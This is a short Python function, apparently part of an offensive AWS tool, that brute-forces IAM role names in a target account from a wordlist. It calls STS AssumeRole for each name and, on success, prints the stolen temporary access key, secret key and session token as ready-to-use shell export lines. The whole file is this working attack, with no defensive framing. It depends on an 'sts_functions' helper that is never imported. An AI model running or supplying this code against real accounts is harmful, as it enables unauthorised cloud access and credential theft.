import boto3

def brute_role(session, wordlist, acc_number, session_name):
    sts = sts_functions.Sts()
    client = sts.get_client(session)
    role_names_file = open(wordlist, 'r')
    role_names = role_names_file.readlines()
    for role_name in role_names:
        arn = "[+] Trying to impersonate role = arn:aws:iam::{}:role/{}".format(acc_number, role_name)
        print(arn, end='')
        AssumeRole = sts.assume_role(client, acc_number, role_name.strip(), session_name)
        if AssumeRole == "AccessDenied":
            pass
        elif AssumeRole["ResponseMetadata"]["HTTPStatusCode"] == 200:
            print("\n[+] Role Impersonation Successful [+]")
            print("==============================================")
            print("export AWS_ACCESS_KEY_ID={}".format(AssumeRole["Credentials"]["AccessKeyId"]))
            print("export AWS_SECRET_ACCESS_KEY={}".format(AssumeRole["Credentials"]["SecretAccessKey"]))
            print("export AWS_SESSION_TOKEN={}".format(AssumeRole["Credentials"]["SessionToken"]))
            break
